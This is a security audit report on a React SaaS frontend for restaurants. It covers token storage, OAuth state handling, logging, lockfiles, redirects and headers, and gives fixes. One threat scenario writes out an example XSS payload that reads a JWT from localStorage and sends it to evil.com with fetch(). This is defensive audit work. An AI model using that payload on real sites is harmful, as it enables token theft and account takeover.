# Security Audit Report: BistroBytes SaaS Frontend

**Audit Date:** 2026-02-01
**Auditor:** Senior Application Security Engineer
**Codebase:** Vite + React 19 SPA (TypeScript/JavaScript)
**Scope:** Full frontend security review

---

## Executive Summary

### Top 5 Risks

| # | Risk | Severity | Impact |
|---|------|----------|--------|
| 1 | **JWT Token Storage in localStorage** | High | XSS attack can exfiltrate authentication tokens, leading to full account takeover |
| 2 | **OAuth State Parameter Not Validated Client-Side** | High | Potential CSRF on OAuth callbacks; relies entirely on backend validation |
| 3 | **Excessive Console Logging in Production** | Medium | 214+ console statements leak sensitive debugging info, internal paths, and tokens presence |
| 4 | **Missing Package Lockfile** | Medium | No reproducible builds; supply chain attacks possible during dependency installation |
| 5 | **Open Redirect Potential in OAuth Flows** | Medium | `window.location.href` set from backend responses could be exploited if backend is compromised |

### Quick Wins
1. Implement HTTP-only cookie-based auth (backend required) or add XSS mitigations
2. Add production log stripping via Vite build config
3. Generate and commit package-lock.json
4. Validate OAuth state parameter on frontend before processing
5. Add CSP headers (backend/CDN required)

### What Could Lead to Real-World Compromise
- **XSS + localStorage tokens**: Any XSS vulnerability (even via a dependency) allows attackers to steal JWT tokens and impersonate users across tenants
- **OAuth CSRF**: Without frontend state validation, an attacker could potentially link their POS account to a victim's tenant
- **Verbose logging**: Debug logs could expose tenant IDs, token presence, and internal architecture to browser dev tools or error reporting services

---

## Findings Table

### Finding 1: JWT Tokens Stored in localStorage

| Field | Value |
|-------|-------|
| **Title** | JWT Authentication Tokens Stored in localStorage |
| **Severity** | High |
| **Category** | Auth/Session/Token Handling |
| **Where** | `src/contexts/RestaurantAuthContext.jsx:108`, `src/services/adminApi.js:22`, `src/pages/admin/PasswordSetupPage.jsx:170` |

**Proof / Reasoning:**
```javascript
// RestaurantAuthContext.jsx:108
localStorage.setItem('restaurant_user', JSON.stringify(userData));
```

The application stores the complete user object including JWT token in localStorage:
```javascript
const userData = {
  email: response.data.email,
  role: response.data.role,
  token: response.data.token,  // JWT TOKEN STORED HERE
  tenantId: response.data.tenantId
};
localStorage.setItem('restaurant_user', JSON.stringify(userData));
```

**Threat Scenario:**
1. Attacker finds XSS vulnerability (via dependency, user input, or DOM manipulation)
2. Attacker injects: `fetch('https://evil.com/steal?token=' + JSON.parse(localStorage.getItem('restaurant_user')).token)`
3. Attacker now has valid JWT for victim's account and tenant
4. Attacker can access all admin functions, modify menus, view orders, access POS integrations

**Fix:**
```javascript
// BACKEND REQUIRED: Implement HTTP-only cookie-based authentication
// The token should never be accessible to JavaScript

// Frontend changes needed:
// 1. Remove token from localStorage
// 2. Add withCredentials: true to axios instances
// api.js
const api = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
  withCredentials: true, // Send cookies with requests
  // ... rest of config
});

// 2. Store only non-sensitive user info in localStorage
const userInfo = {
  email: response.data.email,
  role: response.data.role,
  tenantId: response.data.tenantId
  // NO TOKEN
};
```

**Best Practice Note:** HTTP-only cookies cannot be accessed by JavaScript, eliminating XSS-based token theft. The `SameSite=Strict` or `SameSite=Lax` attribute prevents CSRF.

**Regression Test:**
- Manual: Open browser DevTools, check `localStorage.getItem('restaurant_user')` does not contain token
- Automated: Add test that verifies token is not present in any localStorage keys

---

### Finding 2: OAuth State Parameter Not Validated Client-Side

| Field | Value |
|-------|-------|
| **Title** | OAuth State Parameter Forwarded Without Client Validation |
| **Severity** | High |
| **Category** | Auth/OAuth Security |
| **Where** | `src/pages/admin/CloverOAuthCallback.jsx:110-117`, `src/pages/admin/SquareOAuthCallback.jsx:101-104`, `src/pages/admin/StripeOAuthCallback.jsx:82-86` |

**Proof / Reasoning:**
```javascript
// CloverOAuthCallback.jsx:22-26
const code = searchParams.get('code');
const state = searchParams.get('state');
// ...
// State is forwarded to backend without local validation
const response = await axios.get('/admin/clover/oauth/callback', {
  params: { code, merchant_id: merchantId, state }, // State just passed through
});
```

The OAuth `state` parameter is designed to prevent CSRF attacks. The frontend should:
1. Generate a cryptographically random state value before initiating OAuth
2. Store it (sessionStorage or memory)
3. Validate the returned state matches before processing callback

**Threat Scenario:**
1. Attacker initiates OAuth flow on their own account
2. Attacker obtains callback URL with their authorization code
3. Attacker tricks victim admin into visiting crafted callback URL
4. Victim's session links attacker's POS account to victim's restaurant
5. Attacker gains access to victim's order data via their POS account

**Fix:**
```javascript
// When initiating OAuth (in AdminSettings.jsx):
const initiateCloverOAuth = async () => {
  // Generate cryptographic state
  const state = crypto.randomUUID();
  sessionStorage.setItem('oauth_state', state);

  const response = await adminApiUtils.initiateCloverOAuth({ state });
  if (response.data.authorizationUrl) {
    window.location.href = response.data.authorizationUrl;
  }
};

// In CloverOAuthCallback.jsx:
useEffect(() => {
  const processCallback = async () => {
    const state = searchParams.get('state');
    const storedState = sessionStorage.getItem('oauth_state');

    // VALIDATE STATE BEFORE PROCESSING
    if (!state || state !== storedState) {
      setStatus('error');
      setMessage('Invalid OAuth state. This may be a CSRF attack.');
      sessionStorage.removeItem('oauth_state');
      return;
    }
    sessionStorage.removeItem('oauth_state'); // Clear after use

    // ... rest of callback processing
  };
}, []);
```

**Best Practice Note:** OAuth 2.0 state parameter is mandatory for security. Frontend validation provides defense-in-depth even if backend also validates.

**Regression Test:**
- Manual: Modify `state` param in callback URL, verify error is shown
- Automated: Unit test that processCallback rejects mismatched states

---

### Finding 3: Excessive Console Logging in Production

| Field | Value |
|-------|-------|
| **Title** | 214+ Console Log Statements Leak Debug Information |
| **Severity** | Medium |
| **Category** | Sensitive Data Exposure |
| **Where** | 22 files across `src/` directory |

**Proof / Reasoning:**
```javascript
// api.js:15-18 - Logs every API request
console.debug('API Request:', {
  method: config.method?.toUpperCase(),
  url: `${config.baseURL}${config.url}`,
  hasData: !!config.data
});

// RestaurantAuthContext.jsx:98 - Logs full login response
console.log("Login response:", response.data);

// adminApi.js:41-46 - Logs auth status
console.debug('Admin API Request:', {
  tenantId: config.headers['X-Tenant-Id'],
  hasAuth: !!config.headers.Authorization // Reveals if user is authenticated
});

// CloverOAuthCallback.jsx:78 - Logs token presence
console.log('Found stored credentials - token:', authToken ? 'present' : 'missing');
```

**Threat Scenario:**
1. User opens DevTools (intentionally or via attacker social engineering)
2. Attacker sees: tenant IDs, API endpoints, auth states, internal component names
3. Information aids in crafting targeted attacks against specific tenants
4. Error reporting tools (if integrated) may capture and expose these logs

**Fix:**
```javascript
// vite.config.js - Strip console statements in production
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  esbuild: {
    drop: process.env.NODE_ENV === 'production' ? ['console', 'debugger'] : [],
  },
  // Alternative: Use terser for more control
  build: {
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true,
        drop_debugger: true,
      },
    },
  },
});

// For selective logging, create a logger utility:
// src/utils/logger.js
const isDev = import.meta.env.DEV;

export const logger = {
  debug: (...args) => isDev && console.debug(...args),
  info: (...args) => isDev && console.info(...args),
  warn: (...args) => console.warn(...args), // Keep warnings
  error: (...args) => console.error(...args), // Keep errors
};
```

**Best Practice Note:** Production builds should never expose internal debugging information. Use structured logging services (Sentry, LogRocket) with PII filtering for production error tracking.

**Regression Test:**
- Manual: Run production build, open DevTools console, verify no debug logs appear
- Automated: Build production bundle and grep for `console.` patterns

---

### Finding 4: Missing Package Lockfile

| Field | Value |
|-------|-------|
| **Title** | No package-lock.json, yarn.lock, or pnpm-lock.yaml Present |
| **Severity** | Medium |
| **Category** | Dependencies / Supply Chain |
| **Where** | Project root directory |

**Proof / Reasoning:**
```bash
$ npm audit
npm error code ENOLOCK
npm error audit This command requires an existing lockfile.
```

The `.gitignore` file excludes lock files:
```
# The repository has no lockfile committed
```

**Threat Scenario:**
1. Developer runs `npm install` and gets different dependency versions than production
2. Malicious package update published (supply chain attack)
3. Next install pulls compromised version without warning
4. Compromised code runs in production, potentially stealing data or tokens

**Real-world example:** The `event-stream` incident (2018) where a malicious version was published, affecting millions of installs.

**Fix:**
```bash
# Generate lockfile
npm install --package-lock-only

# Commit it
git add package-lock.json

# Update .gitignore to NOT exclude lockfiles
# Remove any line like:
# package-lock.json

# Add CI check
# .github/workflows/ci.yml
- name: Verify lockfile
  run: npm ci  # Fails if lockfile is missing or out of sync
```

**Best Practice Note:** Lockfiles ensure reproducible builds and enable security auditing. Use `npm ci` in CI/CD to enforce lockfile consistency.

**Regression Test:**
- CI: Add step that runs `npm ci` (fails without lockfile)
- Automated: Pre-commit hook that verifies lockfile exists

---

### Finding 5: Open Redirect Potential in OAuth Flows

| Field | Value |
|-------|-------|
| **Title** | window.location.href Set from Backend Response |
| **Severity** | Medium |
| **Category** | API Security / Open Redirect |
| **Where** | `src/pages/admin/AdminSettings.jsx:697,794,869`, `src/pages/SignupPage.jsx:377` |

**Proof / Reasoning:**
```javascript
// AdminSettings.jsx:697
if (response.data.success && response.data.authorizationUrl) {
  window.location.href = response.data.authorizationUrl; // Redirect to URL from API
}

// SignupPage.jsx:377
window.location.href = response.data.checkoutUrl; // Stripe checkout URL from API
```

The frontend blindly redirects to URLs provided by the backend without validation.

**Threat Scenario:**
1. If backend is compromised or MITM attack occurs
2. Attacker injects malicious `authorizationUrl` in response
3. User is redirected to phishing site mimicking Clover/Square/Stripe
4. User enters credentials on fake site, attacker captures them

**Fix:**
```javascript
// Create URL validation utility
// src/utils/urlValidation.js
const ALLOWED_OAUTH_DOMAINS = [
  'sandbox.dev.clover.com',
  'www.clover.com',
  'connect.squareup.com',
  'connect.squareupsandbox.com',
  'connect.stripe.com',
  'checkout.stripe.com',
];

export const isAllowedRedirectUrl = (url) => {
  try {
    const parsed = new URL(url);
    return (
      parsed.protocol === 'https:' &&
      ALLOWED_OAUTH_DOMAINS.some(domain =>
        parsed.hostname === domain || parsed.hostname.endsWith('.' + domain)
      )
    );
  } catch {
    return false;
  }
};

// Usage in AdminSettings.jsx
import { isAllowedRedirectUrl } from '@/utils/urlValidation';

if (response.data.authorizationUrl) {
  if (!isAllowedRedirectUrl(response.data.authorizationUrl)) {
    toast.error('Invalid authorization URL detected');
    console.error('Blocked redirect to:', response.data.authorizationUrl);
    return;
  }
  window.location.href = response.data.authorizationUrl;
}
```

**Best Practice Note:** Never redirect to URLs from untrusted sources. Whitelist allowed domains for OAuth providers. Backend should also validate, but frontend provides defense-in-depth.

**Regression Test:**
- Unit test: `isAllowedRedirectUrl('https://evil.com')` returns false
- Unit test: `isAllowedRedirectUrl('https://connect.stripe.com/...')` returns true

---

### Finding 6: Setup Token Validated Only Client-Side

| Field | Value |
|-------|-------|
| **Title** | Password Setup Token Has Minimal Client-Side Validation |
| **Severity** | Medium |
| **Category** | Authentication |
| **Where** | `src/utils/tokenValidation.js:11-22`, `src/pages/admin/PasswordSetupPage.jsx:68-86` |

**Proof / Reasoning:**
```javascript
// tokenValidation.js
validateToken: (token) => {
  if (!token || typeof token !== 'string') {
    return { isValid: false, error: 'Invalid token format' };
  }
  if (token.length < 32) {
    return { isValid: false, error: 'Token too short' };
  }
  // Only length check - any 32+ char string passes
  return { isValid: true };
}
```

The token validation only checks length (>= 32 characters). The TODO comment indicates backend verification was planned but not implemented:
```javascript
// verifyTokenWithBackend: async (token) => {
//   // This would make an API call to verify the token
//   // For now, return local validation
//   return Promise.resolve(tokenValidation.validateToken(token));
// }
```

**Threat Scenario:**
1. Attacker guesses/brute-forces 32-character token
2. Client-side validation passes
3. Attacker reaches admin creation form
4. Backend may or may not properly validate (depends on implementation)

**Fix:**
```javascript
// tokenValidation.js - Implement actual backend verification
export const tokenValidation = {
  validateToken: (token) => {
    if (!token || typeof token !== 'string' || token.length < 32) {
      return { isValid: false, error: 'Invalid token format' };
    }
    return { isValid: true }; // Basic format check
  },

  verifyTokenWithBackend: async (token, tenantId) => {
    try {
      const response = await api.post('/auth/verify-setup-token', {
        token,
        tenantId
      });
      return {
        isValid: response.data.valid,
        email: response.data.email,
        error: response.data.error
      };
    } catch (error) {
      return {
        isValid: false,
        error: 'Token verification failed'
      };
    }
  }
};

// PasswordSetupPage.jsx - Use backend verification
const verifyToken = async () => {
  const result = await tokenValidation.verifyTokenWithBackend(token, tenantId);
  if (!result.isValid) {
    setTokenValid(false);
    toast.error(result.error || 'Invalid or expired setup token');
  } else {
    setTokenValid(true);
    if (result.email) {
      setFormData(prev => ({ ...prev, email: result.email }));
    }
  }
};
```

**Best Practice Note:** Token validation must happen server-side. Client-side checks are for UX only. Backend should verify token exists, isn't expired, and hasn't been used.

**Regression Test:**
- Backend required: Endpoint `/auth/verify-setup-token`
- Test: Invalid token returns 400/401
- Test: Expired token returns appropriate error

---

### Finding 7: WebSocket Messages Validated Against Client-Stored Tenant ID

| Field | Value |
|-------|-------|
| **Title** | WebSocket Tenant Validation Uses localStorage Value |
| **Severity** | Low |
| **Category** | Multi-Tenant Isolation |
| **Where** | `src/hooks/useWebSocket.js:99-103` |

**Proof / Reasoning:**
```javascript
// useWebSocket.js:25-29
const userData = localStorage.getItem('restaurant_user');
if (userData) {
  const user = JSON.parse(userData);
  effectiveTenantId = user.tenantId;
}

// useWebSocket.js:99-103
if (notification.tenantId === effectiveTenantId) {
  onMessage(notification);
} else {
  console.warn('Received message for different tenant, ignoring');
}
```

The tenant ID for validation comes from localStorage, which can be manipulated by an attacker who has XSS access.

**Threat Scenario:**
1. Attacker with XSS modifies localStorage tenant ID
2. Attacker receives WebSocket messages for different tenant
3. Attacker sees orders, notifications from competitor restaurants

**Note:** This is marked Low severity because:
- Requires existing XSS vulnerability
- Backend should enforce tenant isolation on what messages are sent
- Frontend filtering is defense-in-depth

**Fix:**
```javascript
// BACKEND REQUIRED: Ensure WebSocket server only sends messages to authenticated
// connections for their tenant. Don't broadcast to /topic/orders.

// Frontend defense-in-depth (already implemented, but improve):
// Store tenant ID in component state from initial auth, not re-read from localStorage
const useWebSocket = (baseUrl, onMessage, enabled = true, authContext) => {
  // Use tenant ID from auth context, not localStorage
  const tenantId = authContext?.user?.tenantId;

  // If tenant ID changes (which shouldn't happen without re-auth), reconnect
  useEffect(() => {
    if (tenantId) {
      // reconnect logic
    }
  }, [tenantId]);
};
```

**Best Practice Note:** Multi-tenant isolation must be enforced server-side. Frontend checks are UX helpers, not security controls.

**Regression Test:**
- Backend: Verify WebSocket only sends tenant-scoped messages
- Manual: Modify localStorage tenant ID, verify no cross-tenant data received

---

### Finding 8: No Rate Limiting Indication on Login Form

| Field | Value |
|-------|-------|
| **Title** | Login Form Has No Client-Side Rate Limit Feedback |
| **Severity** | Low |
| **Category** | Authentication |
| **Where** | `src/pages/admin/AdminLogin.jsx` |

**Proof / Reasoning:**
The login form catches errors but doesn't handle 429 (Too Many Requests) specifically:
```javascript
} catch (error) {
  console.error('Login error:', error);
  toast.error('Invalid credentials. Please check your email, password, and restaurant ID.');
}
```

**Threat Scenario:**
1. Attacker automates login attempts
2. If backend implements rate limiting (which it should), user gets generic error
3. User doesn't understand why legitimate login fails (rate limited)

**Note:** Backend must implement rate limiting. This is a UX improvement for frontend.

**Fix:**
```javascript
} catch (error) {
  console.error('Login error:', error);

  if (error.response?.status === 429) {
    const retryAfter = error.response.headers['retry-after'];
    toast.error(
      `Too many login attempts. Please wait ${retryAfter || '60'} seconds before trying again.`
    );
    // Optionally disable form for duration
    setRateLimited(true);
    setTimeout(() => setRateLimited(false), (retryAfter || 60) * 1000);
  } else if (error.response?.status === 401) {
    toast.error('Invalid credentials. Please check your email and password.');
  } else {
    toast.error('Login failed. Please try again later.');
  }
}
```

**Best Practice Note:** Backend must implement rate limiting (e.g., 5 attempts per minute per IP + tenant). Frontend should provide clear feedback.

**Regression Test:**
- Backend required: Implement and test 429 responses
- Frontend: Test that 429 shows appropriate message

---

### Finding 9: Image Upload MIME Type Can Be Bypassed

| Field | Value |
|-------|-------|
| **Title** | Image Validation Checks Extension and MIME Separately |
| **Severity** | Low |
| **Category** | Input Validation |
| **Where** | `src/components/admin/ImageUpload.jsx:22-46` |

**Proof / Reasoning:**
```javascript
// Check file extension
const fileExtension = fileName.split('.').pop();
if (!allowedFormats.includes(fileExtension)) {
  setError('Invalid file format');
  return false;
}

// Check MIME type
if (!file.type.startsWith('image/')) {
  setError('File must be a valid image');
  return false;
}
```

An attacker could craft a file with:
- Extension: `.jpg`
- MIME type (in File object): `image/jpeg`
- Actual content: malicious (e.g., PHP if server misconfigured)

**Note:** Backend must validate file content (magic bytes), not just extension/MIME.

**Fix:**
```javascript
// Frontend can add basic magic byte check for better UX
const validateImageMagicBytes = async (file) => {
  return new Promise((resolve) => {
    const reader = new FileReader();
    reader.onloadend = (e) => {
      const arr = new Uint8Array(e.target.result).subarray(0, 4);
      const header = arr.reduce((acc, byte) => acc + byte.toString(16).padStart(2, '0'), '');

      // Common image magic bytes
      const validHeaders = [
        '89504e47', // PNG
        'ffd8ffe0', 'ffd8ffe1', 'ffd8ffe2', 'ffd8ffe8', // JPEG variants
        '52494646', // WEBP (starts with RIFF)
      ];

      resolve(validHeaders.some(h => header.startsWith(h)));
    };
    reader.readAsArrayBuffer(file.slice(0, 4));
  });
};

// Usage in validateFile
const validateFile = async (file) => {
  // ... existing checks ...

  const hasValidMagicBytes = await validateImageMagicBytes(file);
  if (!hasValidMagicBytes) {
    setError('File does not appear to be a valid image');
    return false;
  }

  return true;
};
```

**Best Practice Note:** Backend must perform thorough file validation: magic bytes, image processing (ImageMagick/Sharp), and serve from CDN with proper Content-Type.

**Regression Test:**
- Manual: Try uploading `.jpg` file that's actually a text file
- Backend: Verify only valid images are stored

---

## Additional Observations (Non-Critical)

### Console Statements to Review

| File | Count | Notes |
|------|-------|-------|
| src/hooks/useWebSocket.js | 36 | Many connection state logs |
| src/pages/admin/AdminSettings.jsx | 21 | POS integration debugging |
| src/pages/admin/CloverOAuthCallback.jsx | 11 | OAuth flow debugging |
| src/services/adminApi.js | 11 | Request/response logging |
| src/contexts/RestaurantAuthContext.jsx | 7 | Auth state logging |

### Environment Variables (Safe)

All environment variables use `VITE_` prefix (correctly exposed):
- `VITE_API_BASE_URL` - API endpoint
- `VITE_ENVIRONMENT` - Environment name
- `VITE_WEBSOCKET_URL` - WebSocket endpoint
- `VITE_CLOVER_APP_ID` - Clover app ID (public)
- `VITE_GOOGLE_ANALYTICS_ID` - Analytics (public)
- `VITE_HOTJAR_ID` - Hotjar (public)

No secrets found in `.env` or source code.

### No XSS Vectors Found

- No `dangerouslySetInnerHTML` usage
- No `innerHTML` or `insertAdjacentHTML` calls
- No `document.write` usage
- No `eval()` or `new Function()` with user input
- All user input rendered via React's default escaping

### Good Practices Observed

1. **Password validation**: Strong requirements (8+ chars, mixed case, numbers, special chars)
2. **Auto-logout**: Token expiration checked, automatic logout timer
3. **Session validation**: `validateSession()` called on protected routes
4. **File upload validation**: Size limits, extension checks, MIME validation
5. **Multi-tenant headers**: `X-Tenant-Id` consistently applied to requests

---

## Hardening Recommendations

### 1. Content Security Policy (CSP) Proposal

**Recommended CSP for BistroBytes (deploy via server/CDN headers):**

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://static.hotjar.com;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https: blob:;
  connect-src 'self'
    https://localhost:8443
    wss://localhost:8443
    https://api.bistrobytes.com
    wss://api.bistrobytes.com
    https://*.stripe.com
    https://*.google-analytics.com
    https://*.hotjar.com;
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  upgrade-insecure-requests;
```

**Notes:**
- `'unsafe-inline'` needed for Vite's style injection and inline event handlers in dependencies
- Adjust `connect-src` for production API domains
- `frame-ancestors 'none'` prevents clickjacking

### 2. Secure Token Strategy Recommendation

**Current:** JWT in localStorage (vulnerable to XSS)

**Recommended Architecture:**

```
┌──────────────────────────────────────────────────────────────┐
│                      RECOMMENDED FLOW                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. User logs in via /auth/login                            │
│                                                              │
│  2. Backend sets TWO cookies:                                │
│     ┌─────────────────────────────────────────────────────┐ │
│     │ access_token (JWT, 15min)                           │ │
│     │   HttpOnly: true                                    │ │
│     │   Secure: true                                      │ │
│     │   SameSite: Strict                                  │ │
│     │   Path: /api                                        │ │
│     └─────────────────────────────────────────────────────┘ │
│     ┌─────────────────────────────────────────────────────┐ │
│     │ refresh_token (opaque, 7 days)                      │ │
│     │   HttpOnly: true                                    │ │
│     │   Secure: true                                      │ │
│     │   SameSite: Strict                                  │ │
│     │   Path: /api/auth/refresh                           │ │
│     └─────────────────────────────────────────────────────┘ │
│                                                              │
│  3. Frontend stores only user info (email, role, tenantId)  │
│     in localStorage - NO TOKENS                             │
│                                                              │
│  4. All API calls use withCredentials: true                  │
│     Cookies sent automatically                               │
│                                                              │
│  5. CSRF protection via:                                     │
│     - SameSite: Strict cookies                               │
│     - Double-submit cookie pattern (optional)                │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### 3. Logging/Telemetry Hygiene

1. **Strip console in production** (see Finding 3 fix)
2. **Use structured error reporting:**
   ```javascript
   // src/utils/errorReporting.js
   import * as Sentry from '@sentry/react';

   Sentry.init({
     dsn: import.meta.env.VITE_SENTRY_DSN,
     environment: import.meta.env.VITE_ENVIRONMENT,
     beforeSend(event) {
       // Strip PII
       if (event.user) {
         delete event.user.email;
       }
       // Strip sensitive headers
       if (event.request?.headers) {
         delete event.request.headers['Authorization'];
         delete event.request.headers['X-Tenant-Id'];
       }
       return event;
     },
   });
   ```

3. **Redact sensitive data in logs:**
   - Never log tokens, passwords, or full user objects
   - Use IDs instead of emails where possible

### 4. Dependency Hygiene Plan

1. **Immediate: Generate lockfile**
   ```bash
   npm install --package-lock-only
   git add package-lock.json
   ```

2. **Weekly: Automated vulnerability scanning**
   ```yaml
   # .github/workflows/security.yml
   name: Security Scan
   on:
     schedule:
       - cron: '0 0 * * 1'  # Weekly on Monday
     push:
       branches: [main]

   jobs:
     audit:
       runs-on: ubuntu-latest
       steps:
         - uses: actions/checkout@v4
         - uses: actions/setup-node@v4
         - run: npm ci
         - run: npm audit --audit-level=high
         - run: npx better-npm-audit audit
   ```

3. **Monthly: Review and update dependencies**
   ```bash
   # Check for outdated packages
   npm outdated

   # Update patch versions safely
   npm update

   # Review breaking changes before major updates
   npx npm-check-updates -u --target minor
   ```

4. **Pin specific versions for critical security packages:**
   ```json
   {
     "dependencies": {
       "axios": "1.11.0"  // Pin exact version
     },
     "overrides": {
       // Force specific versions for transitive deps
     }
   }
   ```

### 5. Additional Security Headers (Backend/CDN)

```http
# Prevent MIME sniffing
X-Content-Type-Options: nosniff

# Referrer policy - don't leak URLs
Referrer-Policy: strict-origin-when-cross-origin

# Disable browser features not needed
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()

# HSTS (after confirming HTTPS works everywhere)
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# XSS protection (legacy browsers)
X-XSS-Protection: 1; mode=block
```

---

## Summary

| Severity | Count | Findings |
|----------|-------|----------|
| Critical | 0 | - |
| High | 2 | JWT in localStorage, OAuth state validation |
| Medium | 4 | Console logging, missing lockfile, open redirect potential, token validation |
| Low | 3 | WebSocket tenant validation, rate limit feedback, image validation |

### Recommended Priority Order

1. **Week 1:** Generate lockfile, add production log stripping
2. **Week 2:** Implement OAuth state validation on frontend
3. **Month 1:** Work with backend team on HTTP-only cookie auth
4. **Ongoing:** Add CSP headers, implement error reporting with PII filtering

---

*Report generated for BistroBytes SaaS Frontend Security Audit*
